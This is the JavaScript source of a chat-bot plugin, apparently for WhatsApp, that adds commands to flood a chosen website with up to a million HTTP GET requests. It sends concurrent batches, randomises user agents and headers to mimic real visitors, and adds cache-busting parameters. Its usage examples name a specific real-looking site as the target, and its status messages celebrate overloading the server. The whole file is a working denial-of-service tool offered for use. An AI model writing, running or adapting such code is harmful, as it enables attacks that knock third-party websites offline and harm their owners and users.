const config = require('../config')
const axios = require('axios');
const cheerio = require('cheerio');
const UserAgent = require('user-agents');
const cluster = require('cluster');
const os = require('os');

// ======================================================
// WEBSITE ATTACK MODULE - CUSTOM REQUEST COUNT
// ======================================================

let isAttacking = false;
let attackStop = false;
let attackStats = {
    total: 0,
    successful: 0,
    failed: 0,
    startTime: null,
    target: '',
    responseTimes: [],
    statusCodes: {}
};

// ====================== MAIN ATTACK COMMAND ======================
cmd({
    pattern: "attack",
    alias: ["siteattack", "ddos", "flood", "bomb"],
    react: '💀',
    category: "admin",
    desc: "Attack a website with multiple requests",
    use: ".attack https://cinesubz.lk 10000",
    filename: __filename
}, async (conn, m, mek, { from, q, prefix, isMe, isSudo, isOwner, reply }) => {
    try {
        // Security check - only authorized users
        if (!isMe && !isSudo && !isOwner) {
            await conn.sendMessage(from, { react: { text: '⛔', key: mek.key } });
            return await reply("*⛔ You are not authorized to use this command!*");
        }

        if (!q) {
            return await reply(`*📖 Usage:*\n${prefix}attack <website_url> <request_count>\n\n*Example:*\n${prefix}attack https://cinesubz.lk 10000\n\n*Options:*\n• Method: GET (default)\n• Concurrent: 100 requests/cycle\n• Timeout: 5s\n\n*⚠️ Use with caution!*`);
        }

        // Parse parameters
        const parts = q.split(' ');
        let targetUrl = parts[0];
        let requestCount = parseInt(parts[1]) || 1000;

        // Validate URL
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
            targetUrl = 'https://' + targetUrl;
        }

        // Validate request count
        if (isNaN(requestCount) || requestCount < 1) {
            requestCount = 1000;
        }
        if (requestCount > 1000000) {
            requestCount = 1000000; // Max 1 million
        }

        // Check if already attacking
        if (isAttacking) {
            return await reply(`⚠️ *Attack already running!*\n\n🎯 Target: ${attackStats.target}\n📊 Sent: ${attackStats.total}/${attackStats.total + attackStats.failed + attackStats.successful}\n\n*Use .stopattack to stop*`);
        }

        // Confirm with user
        await reply(`💀 *ATTACK STARTED!*\n\n🎯 Target: ${targetUrl}\n📨 Total Requests: ${requestCount.toLocaleString()}\n🧵 Concurrent: 100 requests/cycle\n⏱️ Estimated time: ~${Math.ceil(requestCount / 800)}s\n\n⚠️ *This will overload the target server!*`);

        // Start attack
        await startWebsiteAttack(targetUrl, requestCount, conn, from, mek, reply);

    } catch (e) {
        console.log(e);
        await reply('🚩 *Error starting attack!*');
    }
});

// ====================== STOP ATTACK COMMAND ======================
cmd({
    pattern: "stopattack",
    alias: ["stopatt", "attackstop", "halt"],
    react: '🛑',
    category: "admin",
    desc: "Stop the ongoing attack",
    use: ".stopattack",
    filename: __filename
}, async (conn, m, mek, { from, isMe, isSudo, isOwner, reply }) => {
    try {
        if (!isMe && !isSudo && !isOwner) {
            return await reply("*⛔ You are not authorized!*");
        }

        if (!isAttacking) {
            return await reply("*⚠️ No attack is currently running.*");
        }

        attackStop = true;
        await reply(`🛑 *Stopping attack...*\n\n📊 Final stats:\n✅ Success: ${attackStats.successful}\n❌ Failed: ${attackStats.failed}\n📨 Total: ${attackStats.total}\n🎯 Target: ${attackStats.target}\n⏱️ Duration: ${Math.floor((Date.now() - attackStats.startTime) / 1000)}s`);

    } catch (e) {
        console.log(e);
        await reply('🚩 *Error stopping attack!*');
    }
});

// ====================== ATTACK STATUS COMMAND ======================
cmd({
    pattern: "attackstatus",
    alias: ["attstatus", "attackinfo"],
    react: '📊',
    category: "admin",
    desc: "Check current attack status",
    use: ".attackstatus",
    filename: __filename
}, async (conn, m, mek, { from, isMe, isSudo, isOwner, reply }) => {
    try {
        if (!isMe && !isSudo && !isOwner) {
            return await reply("*⛔ You are not authorized!*");
        }

        if (!isAttacking) {
            return await reply("*⚠️ No attack is currently running.*");
        }

        const elapsed = Math.floor((Date.now() - attackStats.startTime) / 1000);
        const rps = attackStats.total / Math.max(elapsed, 1);
        const avgResponse = attackStats.responseTimes.length > 0 ? 
            (attackStats.responseTimes.reduce((a, b) => a + b, 0) / attackStats.responseTimes.length).toFixed(0) : 'N/A';

        let statusCodes = '';
        Object.keys(attackStats.statusCodes).slice(0, 5).forEach(code => {
            statusCodes += `\n  ${code}: ${attackStats.statusCodes[code]}`;
        });

        await reply(`📊 *ATTACK STATUS*\n\n⏱️ Running: ${elapsed}s\n📨 Total: ${attackStats.total.toLocaleString()}\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n📈 RPS: ${rps.toFixed(1)}\n⏱️ Avg Response: ${avgResponse}ms\n🎯 Target: ${attackStats.target}\n📊 Status Codes:${statusCodes || ' N/A'}\n\n💀 Status: ACTIVE`);
    } catch (e) {
        console.log(e);
        await reply('🚩 *Error fetching status!*');
    }
});

// ====================== ATTACK CORE FUNCTION ======================

async function startWebsiteAttack(targetUrl, requestCount, conn, from, mek, reply) {
    isAttacking = true;
    attackStop = false;
    attackStats = {
        total: 0,
        successful: 0,
        failed: 0,
        startTime: Date.now(),
        target: targetUrl,
        responseTimes: [],
        statusCodes: {}
    };

    const CONCURRENT = 100; // Send 100 requests at a time
    let completed = 0;
    let updateCounter = 0;

    try {
        while (completed < requestCount && !attackStop) {
            const batchSize = Math.min(CONCURRENT, requestCount - completed);
            const promises = [];

            // Create batch of requests
            for (let i = 0; i < batchSize; i++) {
                promises.push(sendSingleRequest(targetUrl));
            }

            // Wait for all requests in batch to complete
            const results = await Promise.allSettled(promises);
            
            // Update stats
            results.forEach(result => {
                attackStats.total++;
                if (result.status === 'fulfilled' && result.value) {
                    attackStats.successful++;
                    if (result.value.statusCode) {
                        attackStats.statusCodes[result.value.statusCode] = 
                            (attackStats.statusCodes[result.value.statusCode] || 0) + 1;
                    }
                    if (result.value.responseTime) {
                        attackStats.responseTimes.push(result.value.responseTime);
                    }
                } else {
                    attackStats.failed++;
                    attackStats.statusCodes['Error'] = (attackStats.statusCodes['Error'] || 0) + 1;
                }
            });

            completed += batchSize;
            updateCounter += batchSize;

            // Send status update every 200 requests or when completed
            if (updateCounter >= 200 || completed >= requestCount || attackStop) {
                const elapsed = Math.floor((Date.now() - attackStats.startTime) / 1000);
                const progress = ((completed / requestCount) * 100).toFixed(1);
                const rps = completed / Math.max(elapsed, 1);
                
                if (!attackStop) {
                    await conn.sendMessage(from, {
                        text: `💀 *ATTACK PROGRESS*\n\n🎯 Target: ${targetUrl}\n📊 Progress: ${progress}% (${completed.toLocaleString()}/${requestCount.toLocaleString()})\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n⏱️ Time: ${elapsed}s\n📈 Rate: ${rps.toFixed(1)} req/s\n\n🔥 Keep firing!`
                    });
                }
                updateCounter = 0;
            }

            // Small delay to prevent CPU overload
            await sleep(50);
        }

        // Attack completed or stopped
        isAttacking = false;
        const elapsed = Math.floor((Date.now() - attackStats.startTime) / 1000);

        if (attackStop) {
            await reply(`🛑 *ATTACK STOPPED BY USER*\n\n📊 Final Stats:\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n📨 Total: ${attackStats.total.toLocaleString()}\n⏱️ Duration: ${elapsed}s\n🎯 Target: ${targetUrl}`);
        } else {
            await reply(`✅ *ATTACK COMPLETED!*\n\n📊 Final Stats:\n✅ Success: ${attackStats.successful.toLocaleString()}\n❌ Failed: ${attackStats.failed.toLocaleString()}\n📨 Total: ${attackStats.total.toLocaleString()}\n⏱️ Duration: ${elapsed}s\n📈 Average: ${(attackStats.total / Math.max(elapsed, 1)).toFixed(1)} req/s\n🎯 Target: ${targetUrl}\n\n💀 Target server should be under heavy load!`);
        }

    } catch (error) {
        console.error('Attack error:', error);
        isAttacking = false;
        await reply(`❌ *Attack error:* ${error.message}`);
    }
}

// ====================== SINGLE REQUEST FUNCTION ======================

async function sendSingleRequest(url) {
    const startTime = Date.now();
    
    try {
        // Randomize the request to bypass caching
        const randomParam = `_=${Date.now()}_${Math.random().toString(36).substring(7)}`;
        const separator = url.includes('?') ? '&' : '?';
        const fullUrl = `${url}${separator}${randomParam}`;

        // Use user-agents package for realistic headers
        const userAgent = new UserAgent();
        
        // Random headers to look like real traffic
        const headers = {
            'User-Agent': userAgent.toString(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,si;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Referer': url,
            'Origin': new URL(url).origin,
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        };

        // Send request with axios (better than fetch for this)
        const response = await axios({
            method: 'GET',
            url: fullUrl,
            headers: headers,
            timeout: 5000,
            maxRedirects: 0,
            validateStatus: () => true, // Don't throw on any status
            decompress: true
        });

        const responseTime = Date.now() - startTime;
        
        // Parse with cheerio if HTML response
        let contentLength = 0;
        if (response.headers['content-length']) {
            contentLength = parseInt(response.headers['content-length']);
        } else if (response.data) {
            contentLength = typeof response.data === 'string' ? response.data.length : JSON.stringify(response.data).length;
        }

        return {
            success: response.status >= 200 && response.status < 500,
            statusCode: response.status,
            responseTime: responseTime,
            contentLength: contentLength,
            headers: response.headers
        };

    } catch (error) {
        const responseTime = Date.now() - startTime;
        
        // Handle different error types
        let statusCode = 'Error';
        if (error.code === 'ECONNABORTED') statusCode = 'Timeout';
        else if (error.code === 'ECONNREFUSED') statusCode = 'Refused';
        else if (error.code === 'ENOTFOUND') statusCode = 'DNS Error';
        else if (error.response) statusCode = error.response.status || 'Error';
        
        return {
            success: false,
            statusCode: statusCode,
            responseTime: responseTime,
            error: error.message
        };
    }
}

// ====================== HELPER FUNCTIONS ======================

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ======================================================
// INSTALLATION COMMAND:
// npm install axios cheerio user-agents
// ======================================================
// USAGE EXAMPLES:
// .attack https://cinesubz.lk 10000    → Attack with 10,000 requests
// .attack https://example.com 50000    → Attack with 50,000 requests
// .attack cinesubz.lk 1000            → Auto-adds https://
// .stopattack                          → Stop the attack
// .attackstatus                        → Check attack status
// ======================================================
